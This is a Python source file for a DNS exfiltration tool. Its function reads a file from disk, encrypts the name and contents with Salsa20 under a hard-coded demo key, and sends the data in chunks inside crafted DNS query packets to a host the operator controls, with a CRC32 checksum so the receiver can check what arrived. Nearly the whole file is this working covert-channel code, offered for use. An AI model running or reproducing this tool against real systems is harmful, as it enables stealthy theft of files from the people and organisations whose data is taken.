import os
import sys
import zlib
import time
import socket
from Crypto.Cipher import Salsa20



"""
This file is meant to assist in data exfiltration over DNS queries.
It can be sniffed by the DNS server alone.
Hostname should be owned by the DNS server you own.
"""
# Constants
READ_BINARY = "rb"
WRITE_BINARY = "wb"
MAX_PAYLOAD_SIZE = "76"
INITIATION_STRING = b"INIT_445"
DELIMITER = b"::"
NULL = b"\x00"
DATA_TERMINATOR = b"\xcc\xcc\xcc\xcc\xff\xff\xff\xff"

def dns_exfil(host="127.0.0.1", path_to_file="C:\\tmp\\test.txt", port=53, max_packet_size=500, key=b"This_key_for_demo_purposes_only!", time_delay=0.01):
    KEY=key
    """
    Will exfiltrate data over DNS to the known DNS server (i.e. host).
    I just want to say on an optimistic note that byte, bit, hex and char manipulation
    in Python is terrible.
    :param host: DNS server IP
    :param path_to_file: Path to file to exfiltrate
    :param port: UDP port to direct to. Default is 53.
    :param max_packet_size: Max packet size. Default is 128.
    :param time_delay: Time delay between packets. Default is 0.01 secs.
    :return:Boolean
    """
    def build_dns(host_to_resolve):
        """
        Building a standard DNS query packet from raw.
        DNS is hostile to working with. Especially in python.
        The Null constant is only used once since in the rest
        it's not a Null but rather a bitwise 0. Only after the
        DNS name to query it is a NULL.
        :param host_to_resolve: Exactly what is sounds like
        :return: The DNS Query
        """
        res = host_to_resolve.split(".")
        dns = b""
        dns += b"\x04\x06"		# Transaction ID
        dns += b"\x01\x00"		# Flags - Standard Query
        dns += b"\x00\x01"		# Queries
        dns += b"\x00\x00"		# Responses
        dns += b"\x00\x00"		# Authoroties
        dns += b"\x00\x00"		# Additional
        for part in res:
            part = part.encode()
            dns += (chr(len(part))).encode() + part
        dns += b"\x00"		# Null termination. Here it's really NULL for string termination
        dns += b"\x00\x01"	# , \x00\x1c for AAAA (IPv6)                                        # ---> Identifier that this Request asks for a AAAA Record
        dns += b"\x00\x01"		# IN Class
        return dns
    # Read file
    try:
        fh = open(path_to_file, READ_BINARY)
        exfil_me = fh.read()
        fh.close()
    except Exception as e:
        print(e)
        sys.stderr.write("Problem with reading file. ")
        return -1

    # +++++++++++++++++++++++++++++++++++   CRC32 Checksum to identify  (mainly) packet loss during exfiltration   +++++++++++++++++++++++++++++++++++++++++++++ #           
    #               Packet loss? --> Sending Frequency too high --> set "time_delay" in function call dns_exfil to 0.05 which should be OK                       #
    # ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ #
    checksum = str(zlib.crc32(exfil_me)).encode("utf-8")  # Calculate CRC32 for later verification

    # Try and check if you can send data
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except socket.error as msg:
        sys.stderr.write('Failed to create socket. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
        return -1
    # Initiation packet:
    dns_request = build_dns(host)                                               # Build the DNS Query
    head, tail = os.path.split(path_to_file)                                       # Get filename


    #++++++++++++++++++++++++++++++++++   ENCRYPTION OF THE FILENAME      ++++++++++++++++++++++++++++++++++++++ #
    cipher = Salsa20.new(key=KEY)                                                                                #
    tail = cipher.nonce + cipher.encrypt(tail.encode())                                                          #
    #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ #

    dns_request += INITIATION_STRING + tail + DELIMITER + checksum + NULL              # Extra data goes here
    addr = (host, port)             # build address to send to
    s.sendto((dns_request), addr)
    # Sending actual file:

    #++++++++++++++++++++++++++++++++++   ENCRYPTION OF the actual file to send      +++++++++++++++++++++++++++ #
    cipher = Salsa20.new(key=KEY)                                                                                #
    exfil_me = cipher.nonce + cipher.encrypt(exfil_me)                                                           #
    # ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ #

    chunks = [exfil_me[i:i + max_packet_size] for i in range(0, len(exfil_me), max_packet_size)]  # Split into chunks

    counter = len(chunks)
    i=0
    for chunk in chunks:
        dns_request = build_dns(host)
        dns_request += chunk + DATA_TERMINATOR
        s.sendto((dns_request), addr)
        time.sleep(time_delay)

        i+=1
        print(f"SENT: {i}/{counter}")

    # Send termination packet:
    dns_request = build_dns(host)
    dns_request += DATA_TERMINATOR + NULL + DATA_TERMINATOR
    s.sendto((dns_request), addr)
    
    return 0